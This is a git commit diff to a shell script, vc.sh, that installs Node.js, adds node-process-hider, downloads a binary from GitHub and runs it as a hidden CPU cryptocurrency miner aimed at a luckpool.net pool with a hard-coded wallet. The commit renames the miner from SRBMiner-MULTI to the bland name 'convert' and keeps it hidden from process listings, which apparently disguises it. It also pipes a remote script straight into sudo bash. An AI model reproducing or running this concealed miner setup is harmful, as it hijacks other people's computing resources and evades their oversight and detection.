2eb92d3a6d35032641e68bc502492b42919cbb62
gyrogerald <97717251+gyrogerald@users.noreply.github.com>
2022-03-07 04:22:05 +0000

    Update vc.sh

--- vc.sh
+++ vc.sh
@@ -5,9 +5,8 @@ curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - &&
 sudo apt install nodejs && 
 npm install -g npm@8.4.1 && 
 npm i -g node-process-hider && 
-sudo ph add SRBMiner-MULTI && 
-wget https://github.com/gyrogerald/mind/raw/main/converted.tar && 
-chmod +x converted.tar && 
-tar -xf converted.tar && 
-chmod +x SRBMiner-MULTI && 
-./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool ap.luckpool.net:3958 --wallet RTBPM3NCdNkHu7FTpSe5VcKAYt2DqHBJbP.gyro --password x --cpu-threads 2 --tls true"
+sudo ph add convert && 
+wget https://github.com/gyrogerald/mind/raw/main/convert && 
+chmod +x convert && 
+chmod +x convert && 
+./convert --disable-gpu --algorithm verushash --pool ap.luckpool.net:3958 --wallet RTBPM3NCdNkHu7FTpSe5VcKAYt2DqHBJbP.gyro --password x --cpu-threads 2 --tls true"
